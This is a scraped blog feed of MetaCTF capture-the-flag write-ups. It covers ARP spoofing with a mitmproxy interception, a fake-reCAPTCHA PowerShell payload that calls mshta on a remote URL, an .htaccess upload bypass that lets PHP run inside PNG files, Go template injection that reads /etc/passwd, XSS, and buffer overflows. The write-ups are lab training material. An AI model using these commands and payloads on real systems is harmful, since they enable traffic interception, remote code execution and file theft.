\u0026#34;\u0026#34; def decode_steganography(file_path): # Reads the file, extracts unused bits, and converts them to readable text. unused_bits_accumulator = \u0026#34;\u0026#34; temp_msg = \u0026#34;\u0026#34; with open(file_path, \u0026#39;r\u0026#39;) as file: for line in file: b64_line = base64.b64decode(line) b64_line = b64_line.decode(\u0026#39;utf-8\u0026#39;) temp_msg += b64_line unused_bits_accumulator += extract_unused_bits(line) # This is the decoded main message. decoded_msg_set(temp_msg) # Break the binary string into chunks of 8 bits and convert to bytes incrementally byte_array = bytearray() for i in range(0, len(unused_bits_accumulator), 8): byte_chunk = unused_bits_accumulator[i:i + 8] if len(byte_chunk) == 8: # Ignore incomplete byte at the end byte_array.append(int(byte_chunk, 2)) # Convert bytes to readable text return byte_array.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # File path file_path = \u0026#34;steg64.txt\u0026#34; decoded_msg = [\u0026#34;\u0026#34;] def decoded_msg_set(s): decoded_msg[0] = s # Decode the steganographic content try: steganography = decode_steganography(file_path) print(\u0026#34;Decoded message:\u0026#34;) print(decoded_msg[0]) print(\u0026#34;\\n\u0026#34;) print(\u0026#34;Decoded steganography:\u0026#34;) print(steganography) except FileNotFoundError: print(f\u0026#34;The file \u0026#39;{file_path}\u0026#39; was not found.\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) Talk to me We managed to tap the headphones of a member of a prolific cyber actor group. Can you listen to their secret plan? Download the wiretap here.\nWe have a PCAP file with USB packets inside.\nWe open the file in Wireshark and can see a little bit over 1000 USB packets. To extract the usb.data.iso field with its payload, we will need tshark (the command-line version of Wireshark).\nExtract the bytes, pipe to tr to delete every new line, and finally xxd to convert to binary.\ntshark -r talktome.pcap -T fields -e usb.iso.data \u0026#39;usb.src == \u0026#34;host\u0026#34;\u0026#39; | tr -d \u0026#39;\\n\u0026#39; \u0026gt; raw.txt | xxd -r -p \u0026gt; flag.raw -r talktome.pcap: Reads the PCAP file. -T fields -e usb.iso.data: Extracts only the usb.iso.data field. \u0026lsquo;usb.src == \u0026ldquo;host\u0026rdquo;\u0026rsquo;: Filters packets originating from the host. tr -d \u0026lsquo;\\n\u0026rsquo;: Removes newline characters to get a clean byte stream. xxd -r -p: Converts to binary format and writes it to flag.raw. Play the file via the terminal or import it to any software that supports raw data. (Make sure it\u0026rsquo;s set to 32-bit.)\nplay -r 44100 -b 32 -c 1 -e signed-integer flag.raw speed 0.7 -r 44100: Sample rate 44.1 kHz. -b 32: 32-bit audio depth. -c 1: Mono (1 channel). -e signed-integer: Interprets the audio data as signed integers. speed 0.7: Playback speed to 70% ","permalink":"https://hexed.space/posts/metactf-november-2024-flash-ctf/","summary":"MetaCTF November 2024 Flash CTF consists of 5 challenges.\nSlithering Security Help me test my sssecurity, can you get the flag from this ssssecure sssscript? Download the challenge file here.\nWe are provided with a small Python script that prompts the user for a password. If the correct password is entered, the script reveals the flag.\nHere\u0026rsquo;s the code:\n#!/usr/bin/env python3 SECRET_FLAG=b\u0026#34;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#34; HASHED_PASSWORD = b\u0026#39;\\x12\\x1eW\\x98\\x00\\xc1C\\xff\\xe3\\xa9\\x15\\xde\\xd9\\x00\\x9b\\xc9\u0026#39; from base64 import b64decode from hashlib import md5 def check_password(password): m = md5() m.","title":"MetaCTF November 2024 Flash CTF"},{"content":" You managed to get access to a device (indicated in red) on the network shown below. One of the hosts on that network is sending the flag over HTTPS to another host every ~5 seconds. Can you intercept it? ?\nThis environment is somewhat limited. Look through the tools available to you on the machine. The network you connect to is not shared with other participants.\nConnect with ssh [REDACTED] -p 7000\nNote: When you connect to the remote host, you are given a Docker container. If you connect again, you will connect to a different container.\nTo capture the flag being sent between the hosts, we need to perform ARP spoofing, packet sniffing, and a MITM attack (proxying). Before we proceed, however, let\u0026rsquo;s go over the initial \u0026ldquo;reconnaissance\u0026rdquo; once we are inside the machine.\nObtain the IP and MAC addresses of the machine we are on. 192.168.0.201 and 02:42:0a:00:01:44\nroot@interceptor:/# ip addr 31631: eth0@if31632: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:0a:00:01:44 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.0.201/24 scope global eth0 valid_lft forever preferred_lft forever Once we know this, we can scan the network with nmap to find out the other hosts.\nThe -sn flag tells nmap to perform quick host discovery using ICMP echo requests, without port scanning.\nroot@interceptor:/# nmap -sn 192.168.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 14:26 UTC Nmap scan report for 192.168.0.24 Host is up (0.000025s latency). MAC Address: 02:42:0A:00:01:42 (Unknown) Nmap scan report for 192.168.0.153 Host is up (0.000034s latency). MAC Address: 02:42:0A:00:01:43 (Unknown) Nmap scan report for 192.168.0.201 Host is up. Nmap done: 256 IP addresses (3 hosts up) scanned in 1.92 seconds Now we know the IP and MAC addresses of the two other hosts on the network that communicate with each other: 192.168.0.24 and 192.168.0.153.\nThe next step is to determine which host is the client sending the data (the flag) and which is acting as the server. This requires us to find the port with nmap or do packet sniffing with tcpdump after the ARP spoofing.\nThis writeup uses the packet sniffing method.\nWe’ll perform ARP spoofing to intercept network traffic between the client and server.\nARP is a communication protocol that links IP and MAC addresses.\nARP spoofing is an attack that occurs on local networks where devices communicate using frames, which include the source and destination MAC addresses - that is OSI Layer 2.\nThe attack poisons the ARP caches by sending ARP messages to the hosts on the network, pretending to be someone else. Thus, all packets will be sent to the spoofed addresses.\nTo execute this attack, we need arpspoof to spoof the IP addresses of the two other hosts.\narpspoof -i eth0 -t 192.168.0.24 192.168.0.153 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; arpspoof -i eth0 -t 192.168.0.153 192.168.0.24 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; IP forwarding is required so the kernel can send the packets to the original destination. It\u0026rsquo;s already enabled though either of these commands can be used to enable it.\necho 1 | tee /proc/sys/net/ipv4/ip_forward or\nsysctl net.ipv4.ip_forward=1 Now it\u0026rsquo;s time to run tcpdump and find out which host is sending the data.\nroot@interceptor:/# tcpdump -i eth0 ... tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 15:17:04.519237 ARP, Reply 192.168.0.24 is-at 02:42:0a:00:01:44 (oui Unknown), length 28 15:17:05.039522 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [S], seq 3433448447, win 64240, options [mss 1460,sackOK,TS val 471734931 ecr 0,nop,wscale 7], length 0 15:17:05.039584 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [S], seq 3433448447, win 64240, options [mss 1460,sackOK,TS val 471734931 ecr 0,nop,wscale 7], length 0 15:17:05.039632 IP 192.168.0.153.4443 \u0026gt; 192.168.0.24.59186: Flags [S.], seq 2542239713, ack 3433448448, win 65160, options [mss 1460,sackOK,TS val 2297543373 ecr 471734931,nop,wscale 7], length 0 15:17:05.039651 IP 192.168.0.201 \u0026gt; 192.168.0.153: ICMP redirect 192.168.0.24 to host 192.168.0.24, length 68 15:17:05.039655 IP 192.168.0.153.4443 \u0026gt; 192.168.0.24.59186: Flags [S.], seq 2542239713, ack 3433448448, win 65160, options [mss 1460,sackOK,TS val 2297543373 ecr 471734931,nop,wscale 7], length 0 15:17:05.039695 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [.], ack 1, win 502, options [nop,nop,TS val 471734932 ecr 2297543373], length 0 15:17:05.039701 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [.], ack 1, win 502, options [nop,nop,TS val 471734932 ecr 2297543373], length 0 15:17:05.058794 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [P.], seq 1:518, ack 1, win 502, options [nop,nop,TS val 471734951 ecr 2297543373], length 517 15:17:05.058833 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [P.], seq 1:518, ack 1, win 502, options [nop,nop,TS val 471734951 ecr 2297543373], length 517 ... At timestamp 15:17:05.039522, 192.168.0.24 (client) initiates the 3-way handshake with 192.168.0.153 (server) on port 4443.\nIn the next step we will need a proxy - mitmproxy. This proxy will intercept the traffic and decrypt it, essentially doing Man-in-the-middle attack.\nThe default port for mitmproxy is 8080. We will redirect the packets coming to port 4443 to port 8080 (mitmproxy).\niptables -t nat -A PREROUTING -p tcp --dport 4443 -j REDIRECT --to-port 8080 Now run the mitmproxy\nNote: Without --ssl-insecure option mitmproxy, will produce an error \u0026ldquo;Cannot validate certificate hostname without SNI\u0026rdquo;\nmitmproxy --mode transparent --listen-port 8080 --ssl-insecure We can browse through the requests.\nInspect the decrypted content.\n","permalink":"https://hexed.space/posts/metactf-middleman/","summary":"You managed to get access to a device (indicated in red) on the network shown below. One of the hosts on that network is sending the flag over HTTPS to another host every ~5 seconds. Can you intercept it? ?\nThis environment is somewhat limited. Look through the tools available to you on the machine. The network you connect to is not shared with other participants.\nConnect with ssh [REDACTED] -p 7000","title":"MetaCTF Middleman"},{"content":"MetaCTF October 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nrunCAPTCHA We\u0026rsquo;re tracking a cyber actor\u0026rsquo;s new malware campaign that\u0026rsquo;s using a fake reCAPTCHA check to infect computers. Thankfully, the malware itself seems to have been taken down, but \u0026gt;can you analyze the initial infection page to look for any signatures?\nWhen visiting the website, you are given \u0026ldquo;reCaptcha\u0026rdquo;, and upon clicking, a modal window appears, instructing you to verify that you are not a robot.\nThe verification process asks you to press: Win+R to bring up the Run command Ctrl+V to paste Enter to execute\nThe website uses Javascript to populate the clipboard with a malicious payload, and you are tricked into executing it.\npowershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A The payload is encoded in Base64, and the decoded payload executes malicious commands using PowerShell and mshta.\necho \u0026#34;bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A\u0026#34; | base64 --decode Payload is decoded and we can see the flag.\nThe -e parameter allows Powershell to execute scripts encoded in Base64.\nmshta is Microsoft HTML Application Host - a tool that can execute HTML Application (HTA) files.\nSpider\u0026rsquo;s Curse Exploring an ancient chamber, you come across a tomb, webs strung from end to end. You brush off the webs and open the tomb, to find yourself cursed! Utter the magic word to \u0026gt; free yourself!\nUsing the file command on the Linux system, we identify the file type as a Linux binary.\nLinux binary.\nWe run the binary, and based on the behavior, we realize it expects a certain input to lift the curse and give the flag.\nWe can also run strings to extract the strings.\n└─$ strings tomb /lib64/ld-linux-x86-64.so.2 puts __stack_chk_fail __libc_start_main __cxa_finalize sprintf __isoc99_scanf strcmp libc.so.6 GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 GLIBC_2.34 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable PTE1 u3UH %02x 4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d347463685f6630725f6d337d As you step into the ancient, cobweb-laden chamber, a chill runs down your spine. .... Not scrolling down too much, right after the strings for glibc, we can see an odd hex string.\nWe can decode it into readable text:\necho \u0026#34;4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d347463685f6630725f6d337d\u0026#34; | xxd -r -p This results in the flag. We obtained it through a shortcut, but it can be done by loading it into Ghidra or IDA for analysis and revealing the internal logic.\nA quick decompile and pseudocode.\nWe can see the whole text that is printed when binary is run. At line, 21 we can see scanf loads the input to v4, then at line 22, v4 is converted to hex and loaded to s1. At line 23 strcmp compares to 4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d3474636 which already extracted from the strings and decoded earlier.\nOpen Application We\u0026rsquo;re looking for enthusiastic applicants - who actively want our flag.\nA simple page with an upload form. It doesn\u0026rsquo;t specify the accepted formats.\nFirst we upload a simple image file to see what the page will do.\nAfter the initial test upload, we get the message\nFirst, we try uploading an image file (e.g., main.png). It is stored in the uploads directory, and trying to access it directly results in a 403 error (Forbidden).\nThe file main.png has been uploaded. File path: uploads/main.png PHP files with .PHP extension?\n\u0026lt;?php $result = shell_exec(\u0026#34;ls\u0026#34;); echo \u0026#34;$result\u0026#34;; ?\u0026gt; Not allowed.\nSorry, PHP files and its variations are not allowed.Sorry, your file was not uploaded. A PNG file with PHP code injected inside? Simplest technique is to add a metadata comment.\nThis can be done with exiftool or with hex editor, such as HxD\nexiftool -comment=\u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34; image.png The PHP code is added after the PNG magic bytes.\nThis works, the file uploads but the code can\u0026rsquo;t be executed.\nLegitimate image file with PHP extension also cannot be uploaded.\nText files can be uploaded.\nThe page only looks at the file extension and does not check MIME Type(Magic bytes) or Content Type.\nWe can try .htaccess file. It can make the server treat PNG files as PHP, and execute them.\nSetHandler application/x-httpd-php or\nAddType application/x-httpd-php .png The file .htaccess has been uploaded. File path: uploads/.htaccess With PHP files now executable, we can run commands such as ls to view the contents of the uploads directory, or ls ../ to explore the root directory.\n\u0026lt;?php $f = file_get_contents(\u0026#39;../flag.txt\u0026#39;); echo $f; ?\u0026gt; ","permalink":"https://hexed.space/posts/metactf-october-2024-flash-ctf/","summary":"MetaCTF October 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nrunCAPTCHA We\u0026rsquo;re tracking a cyber actor\u0026rsquo;s new malware campaign that\u0026rsquo;s using a fake reCAPTCHA check to infect computers. Thankfully, the malware itself seems to have been taken down, but \u0026gt;can you analyze the initial infection page to look for any signatures?\nWhen visiting the website, you are given \u0026ldquo;reCaptcha\u0026rdquo;, and upon clicking, a modal window appears, instructing you to verify that you are not a robot.","title":"MetaCTF October 2024 Flash CTF"},{"content":"MetaCTF September 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nStack Smashers This is the first challenge.\nWe are given the source code for a small C program that takes user input, writes it to a 16-byte buffer (buffer[16]), and then checks if memory.winner is set to true. If it is, the win() function is executed, which prints out the flag.\nThe program uses gets() to read the input. Since gets() is unsafe (it doesn’t perform bounds checking), and there is no input validation, an overflow is possible.\nTo exploit this, we need an input of 17 or more bytes to overflow into the memory of memory.winner. By writing anything to this location, the condition check returns true, and the flag is printed.\nvoid win() { printf(\u0026#34;Congratulations! You\u0026#39;ve successfully performed a buffer overflow! Here\u0026#39;s your flag: FLAG_REDACTED_IN_SNIPPET\u0026#34;); //The flag has been removed from this version of the code, in the real running code, it will be printed when this function is called } int main() { struct { char buffer[16]; bool winner; } memory; memory.winner = false; gets(memory.buffer); if (memory.winner) { win(); } else { printf(\u0026#34;Try again!\\n\u0026#34;); } } Key For Me The second challenge.\nWe\u0026rsquo;re thinking of creating an serial key activation system to distribute our CTFs, can you do a quick check to make sure we\u0026rsquo;re the only ones able to make keys for it? I\u0026rsquo;m just a little paranoid recently. Here\u0026rsquo;s the source code, if you do make a key, enter it at nc [REDACTED] 30008 to claim a flag!\n#!/usr/local/bin/python from flag import FLAG def check_key(key): if len(key) != 8 or ord(key[0]) % 5 != 3 or ord(key[1]) % 4 != 2 or not key[2].isdigit() or not key[3].islower() or not ord(key[4]) \u0026lt;= ord(key[3]) + 5 or not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2 or not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3 or not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True def main(): print(\u0026#34;\u0026#34;\u0026#34; MetaCTF Key Validation System _____ / _ \\\\__.--._._--.-_ | |_| ______________\\\\ \\\\_____/ \u0026#34;\u0026#34;\u0026#34;) key = input(\u0026#34;Enter your activation key: \u0026#34;) if check_key(key): print(f\u0026#34;Congratulations! You unlocked the door, here\u0026#39;s your prize: {FLAG}\u0026#34;) return 0 else: print(\u0026#34;Sadly your key didn\u0026#39;t work this time, keep working on it!\u0026#34;) return 1 if __name__ == \u0026#34;__main__\u0026#34;: main() In this challenge, we need to generate a key to get the flag. The function of interest here is check_key(), which has a single conditional statement with multiple logical conditions. We can break it down to make it easier to understand:\n# Length must be 8 if len(key) != 8: return False # First character - ASCII value must be modulo 5 equals 3. Eg. 8, 15, 28, 33... if ord(key[0]) % 5 != 3: return False # Second character - ASCII value must be modulo 4 equals 2. Eg. 10, 24, 26 if ord(key[1]) % 4 != 2: return False # Third character - Must be a digit if not key[2].isdigit(): return False # Fourth character - Must be in lower case. Eg a-z if not key[3].islower(): return False # Fifth character - ASCII value must be less or equal to the ASCII value of fourth character + 5 if not ord(key[4]) \u0026lt;= ord(key[3]) + 5: return False # Sixth character - Must be a digit and its value must be greater than the value of third character + 2 if not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2: return False # Seventh character - Must be in lower case and its ASCII value must be less the value of fourth character - 3 if not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3: return False # Eighth character - Must be in upper case and its ASCII value must be less than the ASCII value of the fifth character - 4 if not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True We can either write a key generator or try to solve it manually.\nimport random import string def check_key(key): if len(key) != 8 or ord(key[0]) % 5 != 3 or ord(key[1]) % 4 != 2 or not key[2].isdigit() or not key[3].islower() or not ord(key[4]) \u0026lt;= ord(key[3]) + 5 or not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2 or not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3 or not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True def gen_key(): key = [0] * 8 key[0] = chr(random.choice([x for x in range(33, 127) if x % 5 == 3])) key[1] = chr(random.choice([x for x in range(33, 127) if x % 4 == 2])) # Makes sure key[2] and key[5] work together. # key[5] is dependant and it needs to be greater than key[2]+2. This means the maximum value of key[2] can be 6. When key[2]+2=6+2=8, key[5] can only be 9 key[2] = random.choice([x for x in range(0, 7)]) # Makes sure key[3] and key[6] work together. # Must be at least 101(e) key[3] = random.choice(string.ascii_lowercase[5:]) # Makes sure key[4] and key[7] work together. # 69(E). Must be at least 70(F) while True: key[4] = chr(random.choice([x for x in range(33, 127) if x \u0026lt;= ord(key[3])+5 ])) if ord(key[4]) \u0026gt; 69: break # Generates a number between (key[2]+2)+1 and 9. +1 ensures the range begins from greater number. key[5] = random.choice([x for x in range((key[2]+2)+1, 10) ]) key[6] = random.choice([x for x in string.ascii_lowercase if ord(x) \u0026lt; ord(key[3]) - 3 ]) key[7] = random.choice([x for x in string.ascii_uppercase if ord(x) \u0026lt; ord(key[4]) - 4 ]) my_key = \u0026#34;\u0026#34;.join(map(str, key)) return my_key while True: my_key = gen_key() valid = check_key(my_key) if valid == True: print(my_key) break Run the script to generate a key. Connect to the server. Library I\u0026rsquo;ve been developing this little book library app in Go, but I think something is wrong with the way it\u0026rsquo;s handling book requests. Some of the book titles seem to be giving unexpected results\u0026hellip; Maybe you can figure it out?\npackage main import ( \u0026#34;html/template\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) type ReadBook struct{} func (rb ReadBook) ReadBook(filePath string) string { content, err := os.ReadFile(filePath) if err != nil { return \u0026#34;Error reading file: \u0026#34; + err.Error() } return string(content) } var books = map[string]string{ \u0026#34;1984\u0026#34;: \u0026#34;1984 is a dystopian social science fiction novel by George Orwell.\u0026#34;, \u0026#34;brave_new_world\u0026#34;: \u0026#34;Brave New World is a dystopian novel by Aldous Huxley.\u0026#34;, \u0026#34;f451\u0026#34;: \u0026#34;Fahrenheit 451 is a dystopian novel by Ray Bradbury.\u0026#34;, } type Book struct { Title string Param string } func homeHandler(w http.ResponseWriter, r *http.Request) { var bookList []Book for key := range books { bookList = append(bookList, Book{ Title: key, Param: key, }) } tmpl := template.Must(template.ParseFiles(\u0026#34;templates/home.html\u0026#34;)) tmpl.Execute(w, bookList) } func bookHandler(w http.ResponseWriter, r *http.Request) { userBook := r.URL.Query().Get(\u0026#34;book\u0026#34;) bookContent, validBook := books[userBook] if validBook { tmpl := template.Must(template.ParseFiles(\u0026#34;templates/book.html\u0026#34;)) tmpl.Execute(w, bookContent) return } if userBook != \u0026#34;\u0026#34; { tmpl, err := template.New(\u0026#34;book\u0026#34;).Parse(userBook) if err != nil { http.Error(w, \u0026#34;Template parsing error: \u0026#34;+err.Error(), http.StatusInternalServerError) return } tmpl.Execute(w, ReadBook{}) return } http.Error(w, \u0026#34;No book specified\u0026#34;, http.StatusBadRequest) } func main() { port := os.Getenv(\u0026#34;PORT\u0026#34;) if port == \u0026#34;\u0026#34; { port = \u0026#34;8080\u0026#34; // Default to 8080 if no PORT environment variable is set } http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, http.FileServer(http.Dir(\u0026#34;static\u0026#34;)))) http.HandleFunc(\u0026#34;/\u0026#34;, homeHandler) http.HandleFunc(\u0026#34;/books\u0026#34;, bookHandler) log.Println(\u0026#34;Starting server on port \u0026#34; + port) log.Fatal(http.ListenAndServe(\u0026#34;:\u0026#34;+port, nil)) } A simple web page built with Go and its template system.\nThe homepage lists all book titles in the library, each linking to a book page with a description. It uses a GET parameter, \u0026ldquo;book,\u0026rdquo; to pass the title and handle the request.\nThe file containing the logic is main.go, and two html files inside directory \u0026ldquo;templates\u0026rdquo;\nThe function of interest here is bookHandler, which processes the book requests.\nThis is what happens: Here\u0026rsquo;s the process:\nuserBook is assigned the GET parameter \u0026ldquo;book\u0026rdquo;. bookContent, validBook access and retrieve the content from the books map. If validBook is true, the book\u0026rsquo;s description is displayed in the book.html template. Nothing out of the ordinary. If validBook is false, it checks whether userBook is non-empty, creates a new template named book , and parses userBook, which can contain Go template syntax. Finally, it executes the template with an empty instance of ReadBook{}.\nNo input validation or sanitization. This allows template injetion.\nIn the beginning of the code, you can see the defined empty struct and then the defined function/method ReadBook() for the above-mentioned empty struct. The function has a parameter filePath, and the file at that location is opened, read, and the content returned.\nReferring to Go\u0026rsquo;s html/template documentation, in order to do the injection we need to use the template syntax - {{ }} and . to access the template\u0026rsquo;s passed argument - ReadBook{} which can read a file.\nLets try books?book={{.ReadBook \u0026ldquo;/etc/passwd\u0026rdquo;}}\nroot:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin .... Or XSS injection.\n\u0026lt;script\u0026gt;alert(\u0026#39;Injection!\u0026#39;)\u0026lt;/script\u0026gt; It works. Now the flag.\nbooks?book={{.ReadBook \u0026ldquo;flag.txt\u0026rdquo;}}\n","permalink":"https://hexed.space/posts/metactf-september-2024-flash-ctf/","summary":"MetaCTF September 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nStack Smashers This is the first challenge.\nWe are given the source code for a small C program that takes user input, writes it to a 16-byte buffer (buffer[16]), and then checks if memory.winner is set to true. If it is, the win() function is executed, which prints out the flag.\nThe program uses gets() to read the input.","title":"MetaCTF September 2024 Flash CTF"},{"content":"In this challenge, we are provided with an executable, as well as an address and a port to connect to via netcat.\nAfter connecting, we are asked to enter a name. With a little manual \u0026ldquo;fuzzing,\u0026rdquo; we discover that the application crashes with a \u0026ldquo;Segmentation fault\u0026rdquo; error when the input exceeds 25 characters.\nLet\u0026rsquo;s first examine the type of file provided:\n$ file buffers buffers: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=76ade86ea7cea7ad0c6bc6c3a79392d812b8e3bf, for GNU/Linux 3.2.0, not stripped It\u0026rsquo;s a 64-bit ELF, dynamically linked.\nWe load it in IDA for analysis.\nThe strings.\nHere is the generated graph view:\nAt the beginning, two variables are declared:\nvar_12: a string/character array for the input buffer. var_8: a qword type, 8 bytes, or 64 bits. The input from the buffer is written to var_12. Later in the code, the value 0xDEADBEEFCAFEBABE is moved to the rax register, followed by a cmp instruction that compares rax to var_8. A conditional jump (jnz) occurs if the ZERO FLAG (ZF) is not set.\nThe ZERO FLAG remains unset if var_8 does not equal 0xDEADBEEFCAFEBABE. When this happens, the code jumps to location loc_1263, where var_12 is read and printed along with \u0026ldquo;Nice to meet you\u0026hellip;\u0026rdquo;. If var_8 does equal 0xDEADBEEFCAFEBABE, ZF is set, the jump is skipped, and the code calls the win function.\nThe pseudocode\nThe win function provides the flag.\nIn this section of the code, 16 bytes are allocated on the stack, presumably for the filename. The registers are then set up for the sys_open and sys_sendfile syscalls.\nTo summarize, user input is taken and written to var_12, which is 10 bytes long, with no input validation. To obtain the flag, we need to write 0xDEADBEEFCAFEBABE to var_8 via a buffer overflow.\nWe can use echo with the -e option to enable the backslash escape and pipe the input to netcat.\n","permalink":"https://hexed.space/posts/metactf-buffer-1/","summary":"In this challenge, we are provided with an executable, as well as an address and a port to connect to via netcat.\nAfter connecting, we are asked to enter a name. With a little manual \u0026ldquo;fuzzing,\u0026rdquo; we discover that the application crashes with a \u0026ldquo;Segmentation fault\u0026rdquo; error when the input exceeds 25 characters.\nLet\u0026rsquo;s first examine the type of file provided:\n$ file buffers buffers: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.","title":"MetaCTF - Buffer overflow"}]